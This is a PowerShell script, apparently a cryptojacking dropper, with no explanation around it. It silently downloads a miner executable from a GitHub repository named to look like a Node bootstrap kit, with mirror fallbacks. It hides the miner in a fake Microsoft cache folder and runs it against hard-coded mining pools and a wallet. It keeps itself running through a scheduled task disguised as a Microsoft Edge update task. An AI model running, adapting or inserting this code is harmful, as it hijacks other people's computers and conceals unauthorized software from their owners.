$ErrorActionPreference = 'SilentlyContinue'
$d = 'C:\ProgramData\Microsoft\Windows\Caches\h4'
New-Item -ItemType Directory -Force -Path $d | Out-Null
$exe = "$d\pm.exe"
$W = "w-" + ($env:COMPUTERNAME -replace '[^a-zA-Z0-9]','').Substring(0,[Math]::Min(10,($env:COMPUTERNAME -replace '[^a-zA-Z0-9]','').Length))
if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 40MB) {
  $urls = @(
    'https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/refs/heads/main/bin/peakminer.exe',
    'https://gh-proxy.com/https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/refs/heads/main/bin/peakminer.exe',
    'https://ghfast.top/https://raw.githubusercontent.com/quncle1/node-bootstrap-kit/refs/heads/main/bin/peakminer.exe'
  )
  foreach ($u in $urls) {
    try {
      Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile "$d\pm.tmp" -TimeoutSec 300
      if ((Get-Item "$d\pm.tmp").Length -gt 40MB) { Move-Item -Force "$d\pm.tmp" $exe; break }
    } catch {}
  }
}
if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 40MB) { exit 1 }

$bat = "$d\r.bat"
$lines = @(
  '@echo off',
  ('start "" /b "' + $exe + '" --url stratum+tcp://51.79.178.22:3360 --url stratum+tcp://172.235.194.4:3360 --user prl1p08n7f9q0wwf8ykrgxrxrvlwcl8htpgs2da83zgtmfwzkdy6xwnvq4ndq96 --coin pearl -w ' + $W + ' -a 4068')
)
Set-Content -Path $bat -Value $lines -Encoding ASCII
schtasks /create /tn 'MicrosoftEdgeUpdateTaskMachineUA2' /tr ('"' + $bat + '"') /sc minute /mo 5 /f | Out-Null
Start-Process -FilePath $bat -WindowStyle Hidden
"STARTED $W" | Out-File -Encoding ascii "$d\status.txt"
